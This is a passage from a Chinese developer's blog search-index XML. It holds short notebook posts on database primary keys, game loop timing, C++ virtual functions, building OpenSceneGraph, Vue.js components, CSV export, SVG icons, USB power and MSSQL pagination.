开发手册》中规定有以下 MySQL 建表规约： 表必备三字段：id, gmt_create, gmt_modified。 说明：其中id必为主键，类型为unsigned bigint、单表时自增、步长为1。gmt_create, gmt_modified的类型均为date_time类型。 该方法优点是：数据库自动编号，速度快，而且是增量增长，聚集型主键按顺序存放，对于检索非常有利;数字型的，占用空间小，易排序，在程序中传递也方便;如果通过非系统增加记录(比如手动录入，或是用其他工具直接在表里插入新记录，或老系统数据导入)时，非常方便，不用担心主键重复问题。 该方法缺点是：因为自动增长，在手动要插入指定ID的记录时会显得麻烦，尤其是当系统与其他系统集成时，需要数据导入时，很难保证原系统的ID不发生主键冲突。 GUID字符串作为主键Guid:指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的，其算法是通过以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字生成。其格式为:04755396-9A29-4B8C-A38D-00042C1B9028。 GUID字符串作为主键的优点如下： 在扩展数据库的时候，当你有多个数据库包含同一段（片）数据时，比如一个顾客集，使用 GUID 意味着该 ID 在所有的数据库中是唯一标识的，而不是仅仅本数据库唯一。这保障了跨数据库迁移数据的安全。又比如，我曾在项目中把多个数据库分片合并到一个 Hadoop 集群中，也没有产生键的冲突。 在插入数据之前，你就能知道这个主键的值，这避免了一轮的数据查找，并且简化了事务的逻辑，即在你插入子记录之前，因为需要使用这个主键作为一个外键，你必须要知道这个主键的值。 GUID 不会透露数据的信息，因此被用在 URL 中也比自增整数更安全。比如，我是编号 12345678 号顾客，那么人们就会猜测编号为 12345677 和 12345679 的顾客的存在，这就提供了一种攻击向量。（但是后面我们会看到一个更好的替代品） GUID字符串作为主键的缺点如下： GUID 值较长，不容易记忆和输入，而且这个值是随机、无顺序的。 GUID 的值有 16 个字节，与其它那些诸如 4 字节的整数相比要相对大一些。这意味着如果在数据库中使用 uniqueidentifier 键，可能会带来两方面的消极影响：存储空间增大;索引时间较慢。 主流数据库中GUID实现MSSQL在MS Sql 数据库中可以在建立表结构是指定字段类型为uniqueidentifier,并且其默认值可以使用NewID()来生成唯一的Guid(全局唯一标识符). 使用NewID生成的比较随机,如果是SQL 2005可以使用NewSequentialid()来顺序生成,在此为了兼顾使用SQL 2000使用了NewID(). MySQLMySQL中使用UUID()函数生成主键，UUID()函数将生成格式为xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)的字符串，包含32个16进制数字，以连字号分为五段。示例：550e8400-e29b-41d4-a716-446655440000。 参考链接 数据库表主键设计原则,by 乐哉悠哉. [MySQL]数据库主键设计之思考,by 林老师带你学编程. 如何设计数据库的主键,by Veda 原型. [译] 把 UUID 或者 GUID 作为主键？你得小心啦！,by zaraguo. MySQL中使用UUID()函数生成主键,by shiyonghm.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[游戏引擎与物理引擎]]></title>
    <url>%2F2019%2F09%2F16%2F%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E%E4%B8%8E%E7%89%A9%E7%90%86%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[游戏引擎提供一系列可视化开发工具和可重用组件。这些工具通过与开发环境进行集成，方便开发者简单、快速进行数据驱动方式的游戏开发。为了提高游戏开发人员的开发效率，引擎开发者会开发出大量的游戏所需要的软件组件。大多数引擎集成了图形、声音、物理和人工智能等功能部件。游戏引擎会被称为“中间件”，因为它们可以提供灵活和重用平台，向游戏开发者提供所需要的全部核心功能，从而节省大量的游戏开发费用，降低开发的复杂性，缩短游戏的上市时间，所有这些对于高竞争性的游戏产业来说都是关键因素。诸如虚幻系列引擎、Unity3D、Frostbite Engine、zerodin引擎、Doom3引擎、CryENGINE、3DGame Studio、RenderWare、Gamebryo、Virtools以及Source引擎等引擎。 物理引擎是一个计算机程序模拟牛顿力学模型，使用质量、速度、摩擦力和空气阻力等变量。可以用来预测这种不同情况下的效果。它主要用在计算物理学和电子游戏以及计算机动画当中。物理引擎可作为游戏引擎的一个组件。 物理引擎有两种类型常见的型类：实时物理引擎和高精度物理引擎。高精度的物理引擎需要更多的处理能力来计算非常精确的物理，通常使用在科学研究（计算物理学）和计算机动画电影制作。实时物理引擎使用通常使用在电子游戏并且简化运算，降低精确度增以减少计算时间，得到在电子游戏当中可以接受的的处理速度。常用的物理引擎有：ODE、Box2D、PhysX、Bullet、Havok引擎。 游戏主循环FPS(Frame Per Second)游戏帧速60帧是指游戏每秒循环更新60次。 一个游戏程序的基本结构像是这样: 1234while (isRunning)&#123; updateEverything();&#125; 固定拖时间更新法12345while (isRunning)&#123; updateEverything(); sleep(1.0/60);//程序进程等待1/60秒&#125; 累积时间更新法1234567891011121314/* getCurrentTime()每次调用返回当前的时间 */float lastUpdateTime = getCurrentTime();while (isRunning)&#123; float currentTime = getCurrentTime(); float deltaTime = currentTime - lastUpdateTime; /* 每调用updateEverything()后检查时间， 直到过去的时间达到1/60秒就进行下一次更新 */ if (deltaTime &gt;= 1.0/60) &#123; lastUpdateTime = currentTime; updateEverything(); &#125;&#125; 图形更新调用法1234567891011while (isRunning)&#123; updateEverything(); /* 等待垂直同步信号间的空白时间，程序执行到这里会进入等待 一般会被封装在类似swapBuffer之类的图形API中执行， 但是程序要开启了垂直同步的功能才有效。 不过貌似现在的智能手机都默认有垂直同步的效果， 当然手机和PC的硬件技术不同，可能也不叫这个名字了。*/ waitForVerticalBlank(); drawEverything();&#125; 死循环并计算时间差用于更新法1234567891011121314float lastUpdateTime = getCurrentTime();while (isRunning)&#123; float currentTime = getCurrentTime(); float deltaTime = currentTime - lastUpdateTime; lastUpdateTime = currentTime; updateEverything(deltaTime);&#125;void updateMove(float deltaTime)&#123; position.x += speedX * deltaTime; position.y += speedY * deltaTime;&#125; 累积时间半固定时长等图形更新并将时间差用于更新法12345678910111213//假设目标是60帧/秒更新的游戏float lastUpdateTime = getCurrentTime();while (isRunning)&#123; float currentTime = getCurrentTime(); float deltaTime = currentTime - lastUpdateTime; lastUpdateTime = currentTime; /* 如果游戏太卡，过长的时间差可能会导致跳过一些不能跳过的游戏逻辑，所以做一些人为限制 */ if (deltaTime &gt; 1.0/30) deltaTime = 1.0/30; updateEverything(deltaTime); waitForVerticalBlank(); drawEverything();&#125; 上述方法只针对单机游戏有效，如果是网络游戏，考虑客户端之间的同步问题的话，帧速不稳定地变来变去是不好的，我们可以记录过去的时间里跑过的帧数，如果达不到目标帧数就连续进行更新直到赶上需要的帧数。 1234567891011121314151617//假设目标是60帧/秒更新的游戏float startTime = getCurrentTime();long passedFrames = 0;while (isRunning)&#123; float currentTime = getCurrentTime(); float totalTime = currentTime - startTime; long targetTotalFrames = totalTime/(1.0/60); /* 如果某一次更新耗时太久，则会导致passedFrames和targetTotalFrames差太多，所以就连续更新好几次逻辑来赶上目标的更新次数，以保证游戏的进度稳定*/ while (passedFrames &lt; targetTotalFrames) &#123; updateEverything(); passedFrames++; &#125; /* 图形更新应该在逻辑完全完成更新以后才进行 */ drawEverything();&#125; 游戏时间计算机是通过高分辨率计时器来衡量现实时间的，而游戏时间显然不能和真实事件的时间线一致，每个游戏都会有自身的时间线，该时间线和真实时间是两个平行的世界。开发者可以暂停游戏，冻结时间线，也可以通过某种指令来加速时间线，这些对于游戏的调试非常有帮助。一些游戏也会有一些类似时光倒流或者时间变慢的特殊特效，而这些都是通过操作时间线来完成的。 现在假设游戏程序以 60 FPS 在运行，则每帧的处理时间大约为16毫秒。如果想要确保帧率稳定运行，每次循环的处理时间都应该小于这个值，剩余的时间，程序进入睡眠状态： 12345678910while(true)&#123; double start = getCurrentTime(); processInput(); udpate(); render(); sleep(start + MS_PER_FRAME - getCurrentTime());&#125; 如果每帧的处理时间小于16毫秒，sleep 可以保证游戏不会运行的太快。但是如果游戏的每帧超过16毫秒则会出现卡顿现象。 上面的代码中如果正常的情况下，可以确保每帧推进游戏进程16毫秒，但是因为每帧执行的时间无法固定，会导致帧处理时间超出固定的16毫秒而将游戏拖慢。在无法保证帧处理时间的情况下，我们尝试动态的更新策略，让每帧推进的时间不再是固定的16毫秒，而是根据帧处理的时间来动态调整： 12345678910double lastTime = getCurrentTime();while (true)&#123; double current = getCurrentTime(); double elapsed = current - lastTime; processInput(); update(elapsed); render(); lastTime = current;&#125; 每一帧我们都计算花费的真实时间（elapsed），而这条根据真实时间测量的时间线被称为全局时间线，所有的游戏内部 update() 逻辑都是基于这条全局时间线。update() 函数内部的处理逻辑会根据传入的时间间隔来驱动所有物体的动态效果，每个物体都有自己的局部时间线，这个局部时间线和全局时间线之间存在着一定的比例关系。例如游戏中存在一个飞行的子弹，子弹的飞行距离 = 子弹的飞行速度 * 子弹的飞行时间。这里的飞行时间并不一定是上面提到的全局时间线，可能是它的1/2或者2倍都是可以的，具体的快慢比例完全取决于你的游戏配置，这条和全局时间线比例不同的时间线也就是局部时间线。 游戏中渲染通常并不会被时间所影响，因为渲染引擎只是单纯的渲染某一时刻的数据逻辑，一般和时间没有关系。受影响的主要是游戏的逻辑更新部分，为了保证不会出现不同硬件的游戏效果不一致，我们可以固定游戏逻辑的更新时间间隔，确保更新频率保持一致。这样做虽然可能导致在配置好的机器上相同的逻辑被渲染多次，但是这显然并不会影响游戏逻辑。 12345678910111213141516double previous = getCurrentTime();double lag = 0.0; while (true) &#123; double current = getCurrentTime(); double elapsed = current - previous; previous = current; lag += elapsed; processInput(); while (lag &gt;= MS_PER_UPDATE) &#123; update(); lag -= MS_PER_UPDATE; &#125; render();&#125; 现在游戏渲染时间线和游戏的更新时间线已经分离，代码中保持游戏的更新时间线以固定的时间间隔推进，这个时间间隔越短，update() 更新的频率越快，越慢更新的频率越低，过慢的更新频率会导致游戏产生抖动现象，不过因为时间步长和硬件不相关，这种现象只会出现在低端机器上。 通过上面的代码基本上已经可以解决游戏循环的大部分问题了，但是还会出现一种现象，就是当一次循环消耗过长的时间，在下一次游戏渲染的时候，渲染的数据仍然是上一个时间点的数据，而不是真实时间点的数据，这听起来不太容易理解，可以看下面的示意图： 图1 游戏更新与渲染不一致 在图中可以看出这是一个游戏的更新渲染序列，这里看第三次渲染（红点的位置）。因为上一帧的时间花费过长，导致在一帧的逻辑中调用了 update() 两次，进行了两次更新，这时渲染和更新的时间线发生偏移，渲染的真实位置在两次更新逻辑的中间，而渲染的结果却是上一次更新的结果（绿点的位置）。这显然是不对的，因为渲染的结果和现在真实的更新结果并不一样，这时候我们需要计算出二者时间线的偏移值，让渲染的结果符合真实的更新逻辑，也就是说需要计算出从绿点到红点位置的数据变化情况，只有这样渲染的结果才符合常理。 解决这个问题其实很简单，只需要将偏移的大小告诉渲染逻辑即可，渲染逻辑怎样处理这个偏移时间还需要程序自己来决定。 将渲染的代码改为： 1render(lag / MS_PER_UPDATE); 参考链接 第十六章：物理引擎,by 冰点. 为什么单机游戏中的碰撞很不真实？物理引擎真的很难做到和现实一样吗？,by zhihu. 5.1、Faster Physics(一),by GIFPlane. 游戏主循环、帧速控制,by luvfight. 一些游戏程序的基础知识（一）,by luvfight. 一些游戏程序的基础知识（二）,by luvfight. FixedUpdate真的是固定的时间间隔执行吗？聊聊游戏定时器,by 嘉栋. 欧拉方法,by wikipedia. 游戏循环,by 没事造轮子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++虚函数与纯虚函数]]></title>
    <url>%2F2019%2F09%2F15%2FCPlusPlus%E8%99%9A%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BA%AF%E8%99%9A%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[在面向对象程序设计领域，C++、Object Pascal 等语言中有虚函数（英语：virtual function）或虚方法（英语：virtual method）的概念。这种函数或方法可以被子类继承和覆盖，通常使用动态调度实现。 纯虚函数或纯虚方法是一个需要被非抽象的派生类覆盖（override）的虚函数. 包含纯虚方法的类被称作抽象类; 抽象类不能被直接实例化。 一个抽象基类的一个子类只有在所有的纯虚函数在该类(或其父类)内给出实现时, 才能直接实例化. 纯虚方法通常只有声明(签名)而没有定义(实现)，但有特例情形要求纯虚函数必须给出函数体定义. 虚函数示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# include &lt;iostream&gt;# include &lt;vector&gt;using namespace std;class Animal&#123;public: virtual void eat() const &#123; cout &lt;&lt; &quot;I eat like a generic Animal.&quot; &lt;&lt; endl; &#125; virtual ~Animal() &#123;&#125;&#125;; class Wolf : public Animal&#123;public: void eat() const &#123; cout &lt;&lt; &quot;I eat like a wolf!&quot; &lt;&lt; endl; &#125;&#125;; class Fish : public Animal&#123;public: void eat() const &#123; cout &lt;&lt; &quot;I eat like a fish!&quot; &lt;&lt; endl; &#125;&#125;; class GoldFish : public Fish&#123;public: void eat() const &#123; cout &lt;&lt; &quot;I eat like a goldfish!&quot; &lt;&lt; endl; &#125;&#125;; class OtherAnimal : public Animal&#123;&#125;; int main()&#123; std::vector&lt;Animal*&gt; animals; animals.push_back( new Animal() ); animals.push_back( new Wolf() ); animals.push_back( new Fish() ); animals.push_back( new GoldFish() ); animals.push_back( new OtherAnimal() ); for( std::vector&lt;Animal*&gt;::const_iterator it = animals.begin(); it != animals.end(); ++it) &#123; (*it)-&gt;eat(); delete *it; &#125; return 0;&#125; 以下是虚函数 Animal::eat() 的输出： 12345I eat like a generic Animal.I eat like a wolf!I eat like a fish!I eat like a goldfish!I eat like a generic Animal. 纯虚函数示例在C++语言中, 纯虚函数用一种特别的语法[=0]定义。 1234class Abstract &#123;public: virtual void pure_virtual() = 0;&#125;; 纯虚函数的定义仅提供方法的原型. 虽然在抽象类中通常不提供纯虚函数的实现, 但是抽象类中可以包含其实现, 而且可以不在声明的同时给出定义[2]. 每个非抽象子类仍然需要重载该方法, 抽象类中实现的调用可以采用以下这种形式: 12345678910111213void Abstract::pure_virtual() &#123; // do something&#125;class Child : public Abstract &#123; virtual void pure_virtual(); // no longer abstract, this class may be // instantiated.&#125;;void Child::pure_virtual() &#123; Abstract::pure_virtual(); // the implementation in the abstract class // is executed&#125; 参考链接 虚函数和纯虚函数的区别,by hackbuteer1. 虚函数,by wikipedia. C++中虚析构函数的作用,by StarLee. 开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山,by 工程师WWW. VS2010中属性页中，C/C++ —&gt;预处理器定义,by J.M.Liu. 深入理解C/C++混合编程（关于#ifdef __cplusplus extern “C” {…}的用法）,by zzwdkxx. 带你玩转 Visual Studio——带你多工程开发,by luoweifu. c++中冒号（：）和双冒号（::）的用法,by 小金乌会发光－Z&amp;M. C++ 构造函数总结,by chaibubble. 详谈C++保护成员和保护继承,by C语言中文网. c++ 内联函数（一看就懂）,by 兴趣斗士.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04编译安装OSG]]></title>
    <url>%2F2019%2F09%2F14%2FUbuntu16-04%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85OSG%2F</url>
    <content type="text"><![CDATA[OpenSceneGraph是一个开源高性能3D图形工具包，应用程序开发人员在视觉模拟，游戏，虚拟现实，科学可视化和建模等领域使用。 它完全使用标准C ++和OpenGL编写，可在所有Windows平台，OSX，GNU / Linux，IRIX，Solaris，HP-Ux，AIX和FreeBSD操作系统上运行。 OpenSceneGraph现已成为世界领先的场景图技术，广泛应用于视觉，空间，科学，石油天然气，游戏和虚拟现实行业。本文主要记录在Ubuntu 16.04下编译安装OpenSceneGraph的过程。 下载OSG源代码123# cd ~/software# git clone https://github.com/openscenegraph/OpenSceneGraph.git# git checkout OpenSceneGraph-3.6.4 下载安装依赖安装OSG编译所需依赖1# sudo apt-get build-dep openscenegraph 下载OSG数据资源123# cd ~/software# wget http://www.openscenegraph.org/downloads/stable_releases/OpenSceneGraph-3.4.0/data/OpenSceneGraph-Data-3.4.0.zip# unzip OpenSceneGraph-Data-3.4.0.zip 编译安装12345# cd ~/software/openscenegraph# cmake .# make# sudo make install# sudo ldconfig -v //如找不到相关osg库，可运行该命令 运行示例编辑.bashrc文件，添加如下环境变量： 123export PATH=$&#123;PATH&#125;:/home/myaccount/software/OpenSceneGraph/binexport LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/home/myaccount/software/OpenSceneGraph/libexport OSG_FILE_PATH=/home/myaccount/software/OpenSceneGraph-Data:/home/myaccount/OpenSceneGraph-Data/Images 使用如下命令运行示例： 1sh ./runexamples.bat 参考链接 Getting Started,by OpenSceneGraph. ubuntu 环境 安装OSG,by qing101hua. OSG Data Resources,by OpenSceneGraph.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VSCode离线安装插件]]></title>
    <url>%2F2019%2F09%2F07%2FVSCode%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Visual Studio Code（简称VS Code）是一个由微软开发，同时支持Windows 、 Linux和macOS等操作系统且开放源代码的代码编辑器。与Sublime相比，VSCode开源，且有强大的社区支持，各种插件层出不穷。因为工作原因，需要在离线情况下使用VSCode。为了增强VSCode的功能，需要离线情况下安装其插件。具体方法如下： 下载VSCode插件从VSCode的官方市场Extensions for the Visual Studio family of products搜索和下载插件。官方市场下载VSCode插件可能会下载失败，可以跑到插件的github代码库，下载其最新发布版。 图1 下载VSCode插件 离线安装VSCode插件打开VSCode的软件，选择左侧Extension，点击“…”，选择“从VSIX安装”，选择离线下载的VSCode插件进行安装。 图2 离线安装VSCode插件 参考链接 Visual Studio Code,by wikipedia. Extensions for the Visual Studio family of products,by vscode. GitHub最热！码代码不得不知的所有定律法则,by Dave Kerr.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue-js父子组件渲染过程简介]]></title>
    <url>%2F2019%2F09%2F03%2FVue-js%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Vuejs组件化开发是前端工程化的一个重要里程碑。在实际开发过程中，子组件渲染得不到理想的视觉效果。导致这一问题的原因埋藏在Vuejs父子组件的渲染过程。因此简单介绍Vuejs父子组件的渲染过程。 加载渲染过程父beforeCreate-&gt;父created-&gt;父beforeMount-&gt;子beforeCreate-&gt;子created-&gt;子beforeMount-&gt;子mounted-&gt;父mounted 子组件更新过程父beforeUpdate-&gt;子beforeUpdate-&gt;子updated-&gt;父updated 父组件更新过程父beforeUpdate-&gt;父updated 销毁过程父beforeDestroy-&gt;子beforeDestroy-&gt;子destroyed-&gt;父destroyed 参考链接 vue父子组件的渲染顺序, by rosenWang. Vue-js入门简介,by jackhuang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vuejs组件间通信的方法]]></title>
    <url>%2F2019%2F09%2F02%2Fvuejs%E7%BB%84%E4%BB%B6%E9%97%B4%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Vuejs一个吸引人的地方是可以进行组件化开发，避免了前端开发的无序状态。组件无法单独工作，必然会跟父子组件或兄弟组件之间进行通信，以合作实现某种功能。下面即简单介绍Vuejs组件之间的各种通信方式。 方法一、props/$emit方法二、$emit/$on方法三、vuex方法四、$attrs/$listeners方法五、provide/inject Vue2.2.0新增API,这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在起上下游关系成立的时间里始终生效。一言而蔽之：祖先组件中通过provider来提供变量，然后在子孙组件中通过inject来注入变量。provide / inject API 主要解决了跨级组件间的通信问题，不过它的使用场景，主要是子组件获取上级组件的状态，跨级组件间建立了一种主动提供与依赖注入的关系。 需要注意的是：provide 和 inject 绑定并不是可响应的。这是刻意为之的。然而，如果你传入了一个可监听的对象，那么其对象的属性还是可响应的。 虽说provide 和 inject 主要为高阶插件/组件库提供用例，但如果你能在业务中熟练运用，可以达到事半功倍的效果！ 方法六、$parent / $children与 ref参考链接 Vue 组件间通信六种方式（完整版）,by 浪里行舟. 逐行剖析 Vue.js 源码,by 难凉热血.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[客户端使用JS导出CSV文件及中文乱码问题解决方案]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8JS%E5%AF%BC%E5%87%BACSV%E6%96%87%E4%BB%B6%E5%8F%8A%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[在浏览器端无需服务器端支持，直接将JS Array数据导出成CSV文件并下载，是一个常见的开发需求。具体方法如下： 123456789var csvContent= this.$refs.flightInfoGrid.exportdata(&apos;csv&apos;)var link = document.createElement(&apos;a&apos;);// &quot;\ufeff&quot;是为了解决CSV中文乱码问题var blob = new Blob([&quot;\ufeff&quot; +csvContent],&#123;type: &apos;text/csv;charset=utf-8;&apos;&#125;);var url = URL.createObjectURL(blob);link.href = url;link.setAttribute(&apos;download&apos;, &apos;FlightInfo.csv&apos;);link.click();document.body.removeChild(link); 中文乱码问题分析utf-8保存的csv格式要让Excel正常打开的话，必须加入在文件最前面加入BOM(Byte order mark)。 ANSI的话是可以做到正常显示和保存，但是这是有前提的，就是必须在你的电脑（区域和语言设置）把对非Unicode字符处理设置为Chinese，如果是English的话，显示照样是乱码。 Unicode的csv，Excel就根本不支持，打开虽然可以显示不乱码，但是已经不是按逗号显示在不同的单元格里面了，而是按行显示在第一个单元格里面。 BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开头的特殊标记，用来识别Unicode文件的编码类型。具体编码如下表： BOM Encoding EF BB BF UTF-8 FE FF UTF-16 (big-endian) FF FE UTF-16 (little-endian) 00 00 FE FF UTF-32 (big-endian) FF FE 00 00 UTF-32 (little-endian) 微软建议所有的 Unicode 文件应该以 ZERO WIDTH NOBREAK SPACE（U+FEFF）字符开头。这作为一个“特征符”来识别文件中使用的编码和字节顺序。BOM的本意不错，但它并不是一个通用标准，从而导致了很多不兼容的问题。 参考链接 Excel 2007 打开 UTF-8 编码 CSV 文件的BUG,by oyi319. How to export JavaScript array info to csv (on client side)?,by stackoverflow. blob 导出csv 用execl打开出现乱码,by 黑魔法.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用图标icon]]></title>
    <url>%2F2019%2F08%2F25%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%9B%BE%E6%A0%87icon%2F</url>
    <content type="text"><![CDATA[在前端网页的世界里，Icon是最基本的元素之一。使用Icon已成为前端开发者最基本的技能。下面将主要介绍利用SVG Sprites技术在前端中使用Icon的方法。 Icon的演化史Icon最早用img实现，后为了提高效率，减少img请求，出现image sprite技术，实现将多个图片合成一个图片，然后利用 css 的 background-position 定位显示不同的 icon 图标。但该技术维护困难。 随后出现了font库实现页面图标，例如 Font Awesome。目前最常用的是iconfont，里面图标应有尽有，且开源。 iconfont的使用方法unicode优势： 兼容性最好，支持ie6+ 支持按字体的方式去动态调整图标大小，颜色等等 劣势: 不支持多色图标 在不同的设备浏览器字体的渲染会略有差别 具体使用方法参考手摸手，带你优雅的使用 icon，不建议使用。 font-class与unicode使用方式相比，具有如下特点： 兼容性良好，支持ie8+ 相比于unicode语意明确，书写更直观。可以很容易分辨这个icon是什么。 symbol随着IE浏览器逐渐淡出历史舞台，svg-icon 使用形式慢慢成为主流和推荐的方法，请参考未来必热：SVG Sprites技术介绍。其优点有： 支持多色图标了，不再受单色限制。 支持像字体那样通过font-size,color来调整样式。 支持 ie9+ 可利用CSS实现动画。 减少HTTP请求。 矢量，缩放不失真 可以很精细的控制SVG图标的每一部分 具体使用方法如下： 使用SVG Sprite生成SVG雪碧图 图1 SVG雪碧图 加入通用css代码（引入一次就行） 12345678&lt;style type=&quot;text/css&quot;&gt; .icon &#123; width: 1em; height: 1em; vertical-align: -0.15em; fill: currentColor; overflow: hidden; &#125;&lt;/style&gt; 挑选相应图标并获取类名，应用于页面 123&lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot;&gt; &lt;use xlink:href=&quot;#icon-xxx&quot;&gt;&lt;/use&gt;&lt;/svg&gt; 使用svg-icon的好处是再也不用发送woff|eot|ttf| 这些很多个字体库请求了，所有的svg都可以内联在html内。且svg 是一个真正的矢量，不管再怎么的放缩它都不会失真模糊，而且svg可以控制的属性也更加的丰富，也能做出更加生动和复杂的图标。 生成SVG sprite的方法推荐使用svg-sprite-loader ,它是一个Webpack loader。 12import &apos;@/src/icons/qq.svg; //引入图标&lt;svg&gt;&lt;use xlink:href=&quot;#qq&quot; /&gt;&lt;/svg&gt; //使用图标 自动导入多个SVG使用 webpack 的 require.context 实现自动导入多个SVG Icon，避免手动一个个引入。 require.context有三个参数： directory：说明需要检索的目录 useSubdirectories：是否检索子目录 regExp: 匹配文件的正则表达式 123const requireAll = requireContext =&gt; requireContext.keys().map(requireContext)const req = require.context(&apos;./svg&apos;, false, /\.svg$/)requireAll(req) 参考链接 手摸手，带你优雅的使用 icon,by 花裤衩. 未来必热：SVG Sprites技术介绍,by 张鑫旭. 如何在vue项目中优雅的使用SVG,by SilentLove. 关于webpack的require.context,by yeyan1996.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[USB供电能力简介]]></title>
    <url>%2F2019%2F08%2F20%2FUSB%E4%BE%9B%E7%94%B5%E8%83%BD%E5%8A%9B%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[最近买了个行车记录仪，它通过USB接口供电，要求电源输入为5V2A，即要求电源的输出功率要达到10W。不想直接安装到车上，想插在电脑的USB接口上，测试行车记录仪的功能。那么电脑USB接口的供电能力足够吗？ USB标准供电能力USB有多个标准，供电能力各不相同： USB1.1 传输速率最高12Mbps; 电源供应 5V 500mA USB2.0 传输速率最高480Mbps; 电源供应 5V 500mA USB3.0 传输速率最高5Gbps; 电源供应 5V 900mA 最新的USB3.0标准输出电压为5V，输出电流最大为900mA，如果超过可能会因发热造成线路损坏。，因此电脑上的标准USB接口无法支持行车记录仪的正常使用。 注意: 输出电压由电源输出决定，但输出电流大小由负载决定。 USB快充技术目前的快充技术基本有三种：USB-IF组织的USB PD、高通QC、联发科PEP/PE，其他手机厂商的快充方案大多来自这三个。 USB PD（快充标准）目前基本绑定在USB3.0（数据传输标准）和USB Type-C（接头物理标准）上了，也得到谷歌和苹果两大巨头的支持，非常有希望成为未来的统一标准。 高通Quick Charge技术则是实际上被中高端智能手机采用最多的，小米、华硕、LG、乐视、中兴、HTC等最近两年的旗舰都是这个标准，三星FastCharge是QC的马甲，索尼也用QC。 由于硬件端和软件端都被强硬规定， 高通最新的QC 4.0已经使用了USB PD协议，成为了USB PD的一个分支。 联发科PEP技术推广成本最低，广泛用于中低端手机，魅族mCharge也是基于PEP。 不过联发科的PE3.0有可能被苹果采用。 参考链接 关于USB快充你不得不知的几点问题,by EDN. 手机充电是用电脑 USB 快还是用插座快？,by zhihu. 瓦特,by wikipedia. 手机快充是跟数据线有关还是跟充电器有关？,by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSSQL2008中分页查询的实现]]></title>
    <url>%2F2019%2F08%2F17%2FMSSQL2008%E4%B8%AD%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[在后台管理中，涉及分页操作，需要数据库支持limit和offset选项，但在MSSQL2008中这两个选项不支持，不过可以用ROW_NUMBER函数在SQL语句中实现数据分页效果。SQL代码示例如下： 123456SELECT * FROM (SELECT Users.id as id,name,sign,account,audit,roleName,RoleId, Users.deleteFlag as deleteFlag,ROW_NUMBER() OVER (ORDER BY Users.createdAt) AS Seq FROM Users LEFT JOIN Roles ON Users.RoleId=Roles.id)Users Where deleteFlag=0 and Seq &gt; :offset_num and Seq&lt;= :offset_num+:limit_num 参考链接 How to use Offset . . .Fetch Next in SQL SERVER 2008 R2,by microsoft msdn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关系数据库中存储树结构及前端还原的方法]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%AD%98%E5%82%A8%E6%A0%91%E7%BB%93%E6%9E%84%E5%8F%8A%E5%89%8D%E7%AB%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
